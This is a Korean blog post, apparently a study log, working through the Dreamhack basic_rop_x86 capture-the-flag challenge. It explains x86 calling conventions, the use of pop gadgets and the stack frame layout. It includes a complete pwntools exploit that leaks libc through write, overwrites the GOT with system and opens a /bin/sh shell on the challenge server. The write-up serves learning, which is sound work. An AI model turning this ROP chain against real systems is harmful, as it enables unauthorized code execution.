---
layout: post
title: <System Hacking> 14. x86에서의 ROP, 그리고 Calling convention과 Stack Frame 할당의 복습
date: 2022-09-25 22:30:23 +0900
category: System_Hacking
comments: true
---

## ROP 실습문제 (x86버전)

이번 포스팅은 Dreamhack의 basic_rop_x86문제를 직접 복습하면서 설명하도록 하겠다. 소스코드는 x64와 동일하다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}

```

## 64비트와는 다른 32비트, 그리고 생겼던 의문점들과 이에 대한 해결

지난 64비트때의 ROP와 이번 32비트에서의 ROP에서 익스플로잇 코드는 대부분 비슷하다. 그러나, 중요하게 다른 부분들이 있는데, 지금부터 그 이야기를 하려고 한다.

<br/>

우선, Calling Convention, 즉 함수호출규약이 다르다는 부분에서 payload가 달라진다. 64비트에서는 System V 함수호출규약을 사용하므로, 함수가 호출될 때 rax, rdi, rsi, rdx 등의 레지스터에 우선적으로 parameter 값들을 전달한다. 물론, 그 이후 함수의 Stack Frame이 생성되면 거기서 레지스터에 담긴 값들을 사용한다. 반면, 32비트에서는 cdecl, fastcall 등의 규약에 의해서, 대부분 **stack을 통해 parameter들을 전달**한다.

### 첫번째 의문점

여기서 구글링을 하다가 문득 큰 의문점이 생겨서 엄청 고민한 부분이 있다. 이전 포스팅에서도 알 수 있듯이, 64비트에서는 payload에서 return gadget chain 코드를 작성할 때, **'가젯 코드 + 해당 레지스터에 들어갈 값들 + 호출할 함수의 plt'**로 구성했었다. 그러나 32비트에서는 순서를 다르게 호출해야된다고 한다. **'왜 x86에서는 함수 호출 순서가 함수호출 + (가젯 코드) + 인자1 + 인자2 + 인자3 ... 이렇게 되는거지?'** 내가 가진 의문점이었고, 계속 고민 끝에 나만의 결론에 도달했다.

<br/>

생각보다 간단했다. 분명 어셈블리어에서는, push 인자3; push 인자2; push 인자1; call 함수 지만, 애초에 이 말 자체가, **'스택에 올리기 위해서 순서를 거꾸로 한것'**이기 때문이다. 저 어셈블리어의 결과를 스택에서 보면, 결국 스택에서는 함수 호출 + 인자 1 + 인자2 + 인자3 순서대로 이다..! **payload 역시 바로 스택에 값을 집어넣는것**이기 때문에, 순서를 거꾸로 할 필요가 없지!

### 두번째 의문점

그 다음으로는, 64비트에 대한 의문점이 갑자기 들었다. **'64비트에서 함수 인자는 레지스터로 전달되는데, 문득, 그러면 스택 버퍼 오버플로우는 어떻게 일어나는거지?'**라는 의문이 들었다. 왜냐면, 버퍼도 레지스터로 전달될거니까.. 그래서 gdb코드를 잘 보니까, 예를 들어 함수 호출 직전에 lea rax, [rbp-0x40]라는 명령어를 잘 보면, 해당 레지스터에 아예 스택의 주소를 전달해버린다. 그러니 사실상 스택에 얹혀지는 것과 같은거지. 그리고 어차피, 레지스터로 인자전달을 하고 함수가 호출되면, 함수 프롤로그에서 그 값들을 필요한 시기에 스택으로 옮긴다.

### 세번째 의문점

그렇게 두번째 의문점까지 어느정도 해결하고 나서, payload를 작성하고 있는데, 다른 분들의 payload 예시코드를 참고하다보니, pop pop pop ret 가젯을 32비트에서도 쓰고 있었다. 여기서 세번째 의문이 들었다. **'아니.. x86에서는 스택에 push해서 인자를 전달하는데, 왜 pop edi; pop esi; pop ebp; ret 같은 것을 그대로 쓰는거지? push 가젯을 써야 되는거 아닌가? pop 가젯은 피연산자인 레지스터에 값을 넣기 위한 것이잖아?'** 라는 생각이 들었다. 내가 생각해도 좋은 의문점이다.(...)

<br/>

그래서 구글링을 하면서 깨달았다. **x86에서는 pop의 피연산자는 의미가 없다는것.** 왜 그럴까 생각해보니, 이미 payload를 작성할때, pop 가젯 주소 + 인자1 + 인자2 + 인자3 (x86순서기준)로 작성하는데, **이 payload는 이미 BOF되었으므로 이미 Stack에 그대로 들어간다. 즉, 첫번째 의문점에서 해결한 것 처럼, push를 안해도 이미 스택에 있다는 것이지.** 그렇기에, **pop을 3번하는 이유는 (write,read 함수기준으로) 인자 3개부분이 스택에 있고, 그 부분을 지나쳐야 다음 함수가 호출될 수 있게 하기 위해서, esp 레지스터를 옮기는 (증가시키는) 것이다.**

## 익스플로잇 구현, 그리고 마지막 의문점 해결

이렇게 든 의문들을 종합하여 해결한 최종 익스플로잇 코드이다.

```py
from pwn import *

p = remote('host3.dreamhack.games', 16259)
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

binsh = e.bss()

read_offset = libc.symbols['read']
write_offset = libc.symbols['write']

pop_x3_ret_addr = 0x08048689
pop_ret_addr = 0x0804868b

payload = b'A'*0x44 + b'B'*0x4
payload += p32(write_plt)
payload += p32(pop_x3_ret_addr)
payload += p32(1)
payload += p32(write_got)
payload += p32(0x4)

payload += p32(read_plt)
payload += p32(pop_x3_ret_addr)
payload += p32(0)
payload += p32(binsh)
payload += p32(0x8)

payload += p32(read_plt)
payload += p32(pop_x3_ret_addr)
payload += p32(0)
payload += p32(write_got)
payload += p32(0x4)

payload += p32(write_plt)
payload += p32(0)
payload += p32(binsh)

p.send(payload)
# result = p.recvall()
# in order to check the result of write()

p.recvuntil(b'A'*0x40)
write_addr = u32(p.recvn(4))
libc_base = write_addr - write_offset
system_addr = libc_base + libc.symbols['system']

p.send(b'/bin/sh\x00')
p.send(p32(system_addr))

print(hex(write_addr))
print(hex(libc_base))
print(hex(system_addr))

p.interactive()
```

이번 코드에서는 /bin/sh\x00를 64비트때처럼 전달하는데에 EOF 에러가 발생하여 (내 예상은 8바이트짜리 문자열이라 문제가 생기는 것 같다.) 별도로 bss()영역에 문자열을 저장하는 것으로 수정하였다. 여기서 후반부 부분에 GOT overwrite 된 system함수를 호출하는 부분에서 의문이 생겼는데, **'왜 다른 부분에서는 return gadget을 삽입하는데, 여기서는 삽입하지 않는거지? 또 wrtie_plt와 binsh 사이에 0은 무엇을 의미할까?'** 였다. 참고로 이 부분은 다른 분의 해결책을 참고하여 작성하였기 때문에 이런 의문이 생겼다.

<br/>

그렇게 계속 고민을 하다가 결국 의문점을 해결했다. pop ret 가젯을 32비트에서 작성하는 이유는, **그 다음 가젯이 있을 때, pop으로 parameter들을 건너뛰고 esp레지스터를 옮겨야 다음에 이어지는 함수를 실행시킬 수 있어서**이기 때문인데, 마지막 system 함수 호출때는 그 다음 들어올 가젯이 없고 이 함수가 마지막 함수이기 때문에 pop 가젯을 쓸 필요가 없는 것이다. 그리고, **사이에 껴있는 0의 의미는 return address**이다. Stack Frame 할당시의 스택 상태도를 간략하게 나타내보면,

```
0x0000...   |..                |
            |함수 내 지역변수 x|
            |함수 내 지역변수 y|
            |saved EBP         |
            |return address    |
            |parameter a       |
            |parameter b       |
            |parameter c       |
0xffff...   |..                |
```

(나만 알아볼 수 있으면 된다..하하) 이렇게 그려지는데, **함수 호출 전에 push c; push b; push a 명령어가 있고, 그 이후에 call func; 명령어를 수행하는 것이 보통**이다. 그러면 a,b,c가 스택에 저렇게 쌓이게 되고, call func을 하게 되는데, 

```
push    return addr (addr는 call func의 바로 다음 명령어줄을 가리키는 주소)
jmp     func
```

call func 명령어 자체가 위의 명령어로 구성된다. 즉, **a,b,c가 스택에 쌓이고, 그 위에 return address가 쌓인다**는 것이다. 그 이후, **함수의 프롤로그에서 push ebp가 바로 실행되면서 saved EBP가 스택에 올라간다.** 자세한 건, Dreamhack의 어셈블리어 part2 부분의 스택프레임 부분을 복습하자.

<br/>

설명이 길어졌는데, 위의 스택 구조도를 보면, a,b,c 위에 return address가 들어가야 한다. 이는 payload 작성시에도 예외가 아니므로, system 함수를 호출한 뒤에, 바로 parameter로 /bin/sh가 들어가기 전에, 먼저 return address를 넣어줘야 한다는 것이다. **물론, 여기서는 system함수 이후 return address는 중요하지 않으므로, 더미값으로 0을 넣은 것이다. 4바이트짜리 아무 더미값이나 상관없다.**

## 마치며

이렇게 정말 길고 험난한 ROP 부분이 끝이났다.. 아 정말 Stack canary 보다도 공부하는 데에 어려웠다.. 그래도 이번 공부를 통해 함수 호출과 어셈블리의 작동, 그리고 기타 시스템적인 기본기에 대해서 더 단단히 다질 수 있어서 뜻깊었다. 이제 또 당분간 Dreamhack의 다음 진도를 공부하면서, 정리되는대로 포스팅하도록 하겠다.